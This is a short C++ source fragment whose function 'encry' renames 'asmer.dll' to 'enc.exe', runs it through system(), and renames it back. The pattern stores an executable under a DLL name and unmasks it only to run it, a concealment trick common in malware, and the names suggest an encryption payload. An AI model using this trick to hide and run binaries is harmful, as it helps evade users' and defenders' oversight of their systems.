#include <iostream>
#include <string>
#include "main.h"
#include <fstream>

void encry() {
	const char* encprot = "asmer.dll";
	const char* encrisk = "enc.exe";
	std::rename(encprot, encrisk);
	system(encrisk);
	std::rename(encrisk,encprot);
}